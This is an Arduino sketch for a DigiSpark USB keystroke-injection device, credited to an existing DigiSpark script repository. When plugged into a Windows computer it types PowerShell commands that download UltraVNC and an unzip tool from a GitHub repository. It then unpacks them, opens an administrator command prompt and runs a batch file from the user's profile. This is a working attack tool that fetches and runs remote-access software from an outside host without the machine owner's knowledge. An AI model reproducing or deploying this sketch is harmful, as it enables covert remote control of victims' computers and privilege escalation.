//This DigiSpark scripts downloads and executes a powershell script in hidden mode.
//Original author: https://github.com/CedArctic/DigiSpark-Scripts/blob/master/Execute_Powershell_Script/Execute_Powershell_Script.ino
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("$client ) new/object System.Net.WebClient");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile*@https>&&raw.githubusercontent.com&zorbaproject&Guercio&master&UltraVNC.zip@ , @UltraVNC.zip@(");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  //Works only on powershell 5 or later
  /*DigiKeyboard.print("Expand/Archive /Path UltraVNC.zip /DestinationPath UltraVNC");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);*/
  //Works on every system
  DigiKeyboard.print("$client.DownloadFile*@https>&&raw.githubusercontent.com&zorbaproject&Guercio&master&unzip.exe@ , @unzip.exe@(");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(".`unzip.exe .`UltraVNC.zip");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(4000);
  //
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell Start/Process cmd /Verb runAs");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10000);
  DigiKeyboard.print("%USERPROFILE%`guercio.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  for (;;) {
    /*empty*/
  }

}
